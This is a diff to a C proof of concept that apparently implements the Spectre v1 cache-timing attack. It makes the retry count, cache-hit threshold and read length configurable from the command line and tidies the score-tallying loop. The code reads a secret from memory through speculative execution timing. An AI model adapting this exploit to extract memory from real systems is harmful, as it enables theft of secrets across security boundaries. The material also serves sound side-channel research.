@@ -48,8 +48,8 @@
 libflush_session_t* libflush_session;
 #endif
 
-#define MAX_TRIES 2500 /* default was 999 in original code */
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+int MAX_TRIES = 999;
+unsigned int CACHE_HIT_THRESHOLD = 80;
 
 /********************************************************************
 Victim code.
@@ -162,7 +162,7 @@ uint64_t read_cycles()
 ********************************************************/
 
 int counter_thread_ended = 0;
-uint32_t counter = 0;
+uint64_t counter = 0;
 
 void *counter_function(void *x_void_ptr)
 {
@@ -293,30 +293,28 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		  time2 = counter - time1;
 #else		  
 		  time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#endif		  
+#endif
 		  if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
 		    results[mix_i]++; /* cache hit - add +1 to score for this value */
-		    //printf("mix_i=%3d + 1\n", mix_i);
 		  }
 		}
 
-		/* Locate highest & second-highest results results tallies in j/k */
+		/* Locate highest & second-highest */
 		j = k = -1;
 		for (i = 0; i < 256; i++)
 		{
-			if (j < 0 || results[i] >= results[j])
-			{
-				k = j;
-				j = i;
-			}
-			else if (k < 0 || results[i] >= results[k])
-			{
-				k = i;
-			}
+		  if (j < 0 || results[i] >= results[j] ){
+		    k = j;
+		    j = i;
+		  }
+		  else if (k < 0 || results[i] >= results[k] ) {
+		    k = i;
+		  }
 		}
 		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
 			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
+
 	results[0] ^= junk; /* use junk so code above won't get optimized out*/
 	value[0] = (uint8_t)j;
 	score[0] = results[j];
@@ -324,7 +322,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	score[1] = results[k];
 }
 
-int main(void)
+int main(int argc, char **argv)
 {
 	printf("Putting '%s' in memory\n", secret);
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
@@ -357,8 +355,15 @@ int main(void)
 	}
 	printf("[+] Waiting for thread to start?\n");
 	sleep(2);
-#endif 
+#endif
 
+	if (argc == 4) {
+	  sscanf(argv[1], "%d", &MAX_TRIES);
+	  sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);
+	  sscanf(argv[3], "%d", &len);
+	}
+	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);
+	
 	for (size_t i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
